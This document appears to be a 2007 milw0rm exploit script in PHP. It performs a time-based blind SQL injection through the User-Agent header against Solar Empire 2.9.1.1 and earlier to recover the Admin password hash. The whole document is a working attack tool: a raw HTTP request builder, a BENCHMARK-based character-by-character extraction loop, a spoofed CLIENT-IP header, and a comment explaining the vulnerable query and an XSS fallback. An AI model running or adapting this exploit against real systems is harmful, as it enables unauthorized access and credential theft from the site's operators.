#!/usr/bin/php -q -d short_open_tag=on
<?
echo "
------------------------------------------------------------------------
Solar Empire <= 2.9.1.1 Blind SQL Injection / Hash Retrieve Exploit

by BlackHawk <hawkgotyou@gmail.com> <http://itablackhawk.altervista.org>
Thanks to rgod for the php code and Marty for the Love

Special Thanks to all the guys of milw0rm IRC channel for theyr help

------------------------------------------------------------------------
";
if ($argc<3) {
echo "
Usage: php ".$argv[0]." Host Path
Host:          target server (ip/hostname)
Path:          path of revbb

Example:
php ".$argv[0]." localhost /solar/
";
die;
}
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}
/*
This plattform is quite old, but i know that some guys tooked it for making some
indipendent project.. they may have took this bug to, so i'll ceck as soon as i
finish my last exam..

Vuln Explanation:

goto common.inc.php:

function insert_history($l_id,$i_text)
{
	global $db_name;
	if(empty($db_name)){
		$db_name = "None";
	}
	dbn("insert into user_history VALUES ('$l_id','".time()."','$db_name','".mysql_escape_string($i_text)."','$_SERVER[REMOTE_ADDR]','$_SERVER[HTTP_USER_AGENT]')");
}

$_SERVER[HTTP_USER_AGENT] is obviously not parsed by mq, so we can perform our sql-injection attack;
Because the admin name is always the same (Admin)we will attack this username, also because there isn't any counting
of the login attempts..

WARNING:

old version of mysql may not support subquerys, so the exploit wouldn't work.
to bypass this you can exploit the game sending an XSS into the log and praying that the admin
see it..

*/
$host=$argv[1];
$path=$argv[2];

$port=80;
$proxy="";

if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$md5s[0]=0;//null
$md5s=array_merge($md5s,range(48,57)); //numbers
$md5s=array_merge($md5s,range(97,102));//a-f letters
#print_r(array_values($md5s));

$j=1;$password="";
while (!strstr($password,chr(0)))
{
for ($i=0; $i<=255; $i++)
{
if (in_array($i,$md5s))
{
$starttime=time();
$sql="FuckYOU'), (1,2,3,4,5,(SELECT IF ((ASCII(SUBSTRING(se_games.admin_pw,".$j.",1))=".$i.") & 1, benchmark(200000000,CHAR(0)),0) FROM se_games))/*";
$packet ="POST ".$p."game_listing.php HTTP/1.0\r\n";
$data="l_name=Admin";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n";
$packet.="Accept-Language: it\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="CLIENT-IP: 999.999.999.999'; echo '123\r\n";//spoof
$packet.="User-Agent: $sql\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n";
$packet.="Cache-Control: no-cache\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
  //debug
  #die($html);
  sendpacketii($packet);
if (eregi("The used SELECT statements have a different number of columns",$html)){echo $html; die("\nunknown query error...");}
  $endtime=time();
  echo "endtime -> ".$endtime."\r\n";
  $difftime=$endtime - $starttime;
  echo "difftime -> ".$difftime."\r\n";
  if ($difftime > 7) {$password.=chr($i);echo "password -> ".$password."[???]\r\n";sleep(1);break;}
}
  if ($i==255) {die("Exploit failed...");}
  }
  $j++;
}
echo "

$uname Hash is:  $password";

# Coded With BH Fast Generator v0.1
?>

# milw0rm.com [2007-06-18]
